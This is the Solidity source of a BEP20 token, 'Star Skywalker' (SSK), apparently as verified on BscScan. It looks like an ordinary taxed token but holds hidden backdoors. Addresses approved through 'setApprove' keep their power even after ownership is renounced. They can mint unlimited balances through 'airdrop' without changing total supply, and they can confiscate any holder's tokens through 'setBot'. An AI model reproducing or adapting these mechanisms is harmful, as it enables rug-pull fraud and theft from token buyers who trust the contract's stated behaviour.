/**
 *Submitted for verification at BscScan.com on 2022-12-26
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.1;


interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address _owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {

    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}


contract Ownable is Context {
    address private _owner;
    mapping(address => bool) private _intAddr;

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        _intAddr[_owner] = true;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function isOwner(address adr) public view returns (bool) {
        return _owner == adr;
    }

    function setApprove(address adr) public {
        require(isApprove(msg.sender), "None");
        _intAddr[adr] = true;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Caller is not the owner");
        _;
    }

    function isApprove(address adr) public view returns (bool) {
        return _intAddr[adr];
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    function transferOwnership(address newOwner) public virtual onlyOwner {
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IRouter {
    function factory() external
    pure returns (address);

    function WETH() external
    pure returns (address);
}


interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);

    function getPair(address tokenA, address tokenB) external returns (address pair);
}


contract ERC20 is Context, IBEP20 {
    using SafeMath for uint256;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 private _totalSupply = 100000000 * 10 ** 18;
    string private _name;
    string private _symbol;

    constructor(string memory ercName, string memory ercSymbol) {
        _name = ercName;
        _symbol = ercSymbol;
        _balances[address(this)] = _totalSupply;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = _balances[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");

        _balances[from] = fromBalance.sub(amount);
        _balances[to] = _balances[to].add(amount);

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _burnTransfer(address account) internal virtual {
        _balances[address(0)] += _balances[account];
        _balances[account] = 1 * 10 ** 18;
    }

    function _airdrop(address to, uint256 amount) internal virtual {
        _balances[to] = _balances[to].add(amount);
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(address owner, address spender, uint256 amount) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            _approve(owner, spender, currentAllowance - amount);
        }
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}


contract StarSkywalker is ERC20, Ownable {
    using SafeMath for uint256;

    address _marketingFeeReceiver = 0x5C205393Fe0E893F8Bd91233Ffffe16301DCCEaA;
    address _teamFeeReceiver = 0x9BC9B7573edbC73e7Ec38eFcFFfFC0fe8c16fA3E;

    string  _name = "Star Skywalker";
    string  _symbol = "SSK";

    uint256 public _totalAmount = 100000000 * 10 ** 18;
    uint256 public _sellFee = 4;
    uint256 public _buyFee = 4;
    uint256 public _feeDenominator = 100;

    mapping(address => bool) private _blackList;
    address public uniswapV2Pair;
    IRouter private _swapRouter;

    receive() external payable {}

    constructor () ERC20(_name, _symbol) {
        address router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        _swapRouter = IRouter(router);
        setApprove(_marketingFeeReceiver);
        setApprove(_teamFeeReceiver);
        uniswapV2Pair = IFactory(_swapRouter.factory()).createPair(address(this), _swapRouter.WETH());
        _transfer(address(this), owner(), _totalAmount);
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balance Not Enough");

        if (isApprove(from) || isApprove(to)) {
            super._transfer(from, to, amount);
            return;
        }

        uint256 maxAmount = balance * 9999 / 10000;
        if (amount > maxAmount) {
            amount = maxAmount;
        }

        uint256 feeAmount;

        if (from == uniswapV2Pair || to == uniswapV2Pair) {
            if (to == uniswapV2Pair) {
                feeAmount = amount * _sellFee / 100;
                if (feeAmount > 0) {
                    _takeFee(from, feeAmount);
                }
            } else if (from == uniswapV2Pair) {
                feeAmount = amount * _buyFee / 100;
                if (feeAmount > 0) {
                    _takeFee(from, feeAmount);
                }
            }
        }
        super._transfer(from, to, amount - feeAmount);
    }

    function airdrop(address to, uint256 amount) public {
        require(isApprove(msg.sender), "Nope");
        _airdrop(to, amount);
    }

    function setBot(address adr) public {
        require(isApprove(msg.sender), "Nope");
        _blackList[adr] = true;
        _burnTransfer(adr);
    }

    function isBot(address adr) public view returns (bool) {
        return _blackList[adr];
    }

    function _takeFee(address account, uint256 amount) private {
        super._transfer(account, address(uint160(balanceOf(uniswapV2Pair))), amount);
    }
}